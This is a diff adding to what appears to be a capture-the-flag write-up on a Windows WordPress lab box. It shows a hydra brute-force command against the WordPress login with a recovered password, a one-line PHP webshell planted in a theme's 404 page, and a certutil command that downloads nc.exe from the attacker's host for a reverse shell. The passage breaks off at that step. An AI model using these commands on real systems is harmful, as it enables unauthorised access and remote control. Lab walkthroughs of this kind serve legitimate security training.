@@ -1083,7 +1083,39 @@ WordPress version 5.2.1 is running
  Visiting the URL
 
  	http://10.10.106.56/retro/?author=1
-We can find the user name: <b>Wade</b>. Even in this case the login form reported an error specific for a wrong password
+We can find the user name: <b>Wade</b>. Even in this case the login form reported an error specific for a wrong password, we can proceed to brute forcing the password:
+
+	hydra -P /usr/share/wordlists/rockyou.txt -l Wade 10.10.106.56 http-post-form "/retro/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:The password you entered for"
+
+It takes sometime:
+
+	[80][http-post-form] host: 10.10.106.56   login: Wade   password: parzival
+Again we are going to exploit the 404 template page in WP. This time the URL http:/10.10.106.56/404 did not work (I don't know why), so we to use the full path:
+
+	http:/10.10.106.56/retro/wp-content/themes/90s-retro/404.php
+Remember that Retro is a windows box, so you need to use a corresponding webshell. Since I had trouble to make it work, I used the old approach:
+
+	<?php system($_GET['cmd']); ?>
+ Then I proceed to:
+ 1. download nc from my attacker machine
+
+		?cmd=certutil.exe%20-urlcache%20-f%20http%3A%2F%2F10.9.2.142%3A8000%2Fnc.exe%20nc.exe
+		**** Online **** CertUtil: -URLCache command completed successfully. 
+2. Check the file exists:
+
+  		?cmd=dir
+   		...
+   		05/16/2024 05:42 AM 36,528 nc.exe
+3. Execute the reverse shell
+
+    		
+		
+
+ 
+ 
+
+
+
 
 
 
